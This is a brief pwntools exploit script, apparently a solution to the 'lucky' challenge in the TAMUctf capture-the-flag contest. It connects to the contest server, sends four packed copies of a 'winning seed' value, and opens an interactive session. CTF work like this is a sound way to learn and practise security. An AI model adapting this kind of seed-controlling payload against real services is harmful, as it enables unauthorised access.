#!/usr/bin/env python3

from pwn import *

p = remote("tamuctf.com", 443, ssl=True, sni="lucky")
#p = process("./lucky")

winning_seed = 0x00563412

payload = p32(winning_seed);
payload += p32(winning_seed);
payload += p32(winning_seed);
payload += p32(winning_seed);
payload += b"\n";

p.send(payload)

p.interactive()
